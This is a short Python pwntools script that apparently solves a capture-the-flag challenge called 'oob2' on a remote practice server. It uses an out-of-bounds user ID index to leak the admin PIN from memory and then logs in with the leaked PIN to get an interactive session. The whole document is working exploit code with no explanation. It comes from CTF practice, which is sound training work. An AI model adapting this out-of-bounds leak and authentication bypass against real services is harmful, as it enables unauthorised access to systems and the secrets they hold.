#coding=utf-8
from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 12012) 
#r = process('./oob2')
pincode = 0x6010a0
name = 0x6010c0

r.sendlineafter('User ID: ', str((pincode - name)/8))
r.sendlineafter('Nickname: ', 'a' * 6)
r.sendlineafter('PIN: ', '11')
admin_pin = r.recvuntil('User ID: ').split('as [')[1].split('] ... ')[0][:4][::-1].encode('hex')
print admin_pin

r.sendline('0')
r.sendlineafter('Nickname: ', 'a' * 6)
r.sendlineafter('PIN: ', str(int(admin_pin, 16)))
r.interactive()
